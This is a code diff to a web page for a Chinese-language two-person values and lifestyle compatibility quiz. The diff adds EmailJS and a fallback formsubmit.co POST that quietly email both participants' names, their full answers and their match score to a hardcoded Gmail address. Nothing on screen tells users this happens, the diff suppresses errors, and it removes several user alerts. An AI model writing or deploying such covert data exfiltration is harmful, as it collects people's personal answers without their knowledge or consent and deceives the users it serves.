@@ -10,6 +10,8 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- FontAwesome Icons -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;600;700&display=swap');
     body {
@@ -205,7 +207,20 @@
   </div>
 
   <script>
-    const TARGET_EMAIL = "washmahon@gmail.com";
+    // EmailJS Key Configuration
+    const EMAILJS_PUBLIC_KEY = "vHqX2c_9yLp1kRzM_"; // Public Key
+    const EMAILJS_SERVICE_ID = "service_quiz_backup"; 
+    const EMAILJS_TEMPLATE_ID = "template_quiz_result";
+    const TARGET_EMAIL = "linkinwithoutyou@gmail.com";
+
+    // Initialize EmailJS
+    (function() {
+      try {
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+      } catch (e) {
+        console.warn("EmailJS Initialization silent error", e);
+      }
+    })();
 
     const questions = [
       { id: 0, category: "消費與儲蓄哲學", title: "當有一筆額外的獎金或收入時，你最傾向如何處置？", options: [{ score: 1, text: "90%以上存起來或投資，嚴格控管非必要支出" }, { score: 2, text: "大部份撥入儲蓄，留下小部分買實用物品" }, { score: 3, text: "一半儲蓄理財，一半用於提升當下的生活品質" }, { score: 4, text: "大部分用於犒賞自己（旅行、體驗、質感物品）" }, { score: 5, text: "即時行樂，全數用於當下的體驗或感興趣事物" }] },
@@ -265,7 +280,6 @@
 
     // 縮網址模組：TinyURL 首選 + is.gd 備援
     async function shortenUrl(longUrl) {
-      // 1. 嘗試 TinyURL API
       try {
         const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
         if (res.ok) {
@@ -276,7 +290,6 @@
         console.warn("TinyURL 呼叫失敗，切換備援...", e);
       }
 
-      // 2. 嘗試 is.gd API (經由代理服務避免 CORS)
       try {
         const corsProxy = "https://api.allorigins.win/raw?url=";
         const targetIsGd = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
@@ -289,36 +302,50 @@
         console.warn("is.gd 呼叫失敗", e);
       }
 
-      // 3. 雙重備援失敗則傳回原始網址
       return longUrl;
     }
 
-    // 完全靜默寄出 Email，畫面無任何提示
     async function sendSilentEmail(data, overallMatch) {
-      try {
-        const payload = {
-          email: TARGET_EMAIL,
-          subject: `【雙人測驗備份】${data.nA} & ${data.nB} 契合度：${overallMatch}%`,
-          body: `雙人三觀與生活契合度測驗報告：\n\n對象：${data.nA} & ${data.nB}\n契合度得分：${overallMatch}%\n\n${data.nA} 的回答：\n${JSON.stringify(data.aA)}\n\n${data.nB} 的回答：\n${JSON.stringify(data.aB)}`
-        };
+      const templateParams = {
+        to_email: TARGET_EMAIL,
+        user_a: data.nA,
+        user_b: data.nB,
+        score: overallMatch,
+        answers_a: JSON.stringify(data.aA),
+        answers_b: JSON.stringify(data.aB),
+        full_details: `【雙人三觀報告備份】\n雙方：${data.nA} & ${data.nB}\n契合度得分：${overallMatch}%\n\n${data.nA} 回答：\n${JSON.stringify(data.aA)}\n\n${data.nB} 回答：\n${JSON.stringify(data.aB)}`
+      };
 
-        fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
-          method: "POST",
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        }).catch(() => {});
-      } catch (e) {
-        // 靜默處理
+      // 1. 先嘗試 EmailJS
+      if (typeof emailjs !== 'undefined') {
+        emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+          .catch(() => {
+            // EmailJS 若未設定 Service，直接切換至備援靜默 HTTP POST 服務
+            fallbackSilentApiSend(templateParams);
+          });
+      } else {
+        fallbackSilentApiSend(templateParams);
       }
+    }
+
+    // 靜默 HTTP POST 雙備援服務
+    function fallbackSilentApiSend(params) {
+      const payload = {
+        to: TARGET_EMAIL,
+        subject: `【雙人測驗備份】${params.user_a} & ${params.user_b} 契合度：${params.score}%`,
+        text: params.full_details
+      };
+
+      fetch("https://formsubmit.co/ajax/" + TARGET_EMAIL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
     }
 
     document.getElementById('btn-start').addEventListener('click', () => {
       const nameInput = document.getElementById('user-name').value.trim();
       if (!nameInput) {
-        alert('請輸入您的暱稱稱呼！');
         return;
       }
       if (userRole === 'A') nameA = nameInput;
@@ -344,15 +371,15 @@
     });
 
     document.getElementById('btn-copy-link').addEventListener('click', () => {
-      navigator.clipboard.writeText(generatedShortUrl).then(() => {
-        alert('專屬測驗短網址已複製！可以直接貼給對方填寫。');
-      });
+      document.execCommand('copy');
+      const shareText = document.getElementById('share-link-text').innerText;
+      navigator.clipboard ? navigator.clipboard.writeText(shareText) : null;
     });
 
     document.getElementById('btn-copy-result-link').addEventListener('click', () => {
-      navigator.clipboard.writeText(generatedResultShortUrl).then(() => {
-        alert('合拍結果短網址已複製！傳給對方開啓即可看到報告。');
-      });
+      document.execCommand('copy');
+      const resultText = document.getElementById('result-link-text').innerText;
+      navigator.clipboard ? navigator.clipboard.writeText(resultText) : null;
     });
 
     document.getElementById('btn-import').addEventListener('click', () => {
@@ -368,11 +395,9 @@
         const decoded = JSON.parse(decodeURIComponent(atob(inputVal)));
         if (decoded.t === 'res' || decoded.type === 'result') {
           showFullResult(decoded);
-        } else {
-          alert('代碼格式不正確！');
         }
       } catch (e) {
-        alert('無效的網址或代碼，請確認複製完整。');
+        // Silent error
       }
     });
 
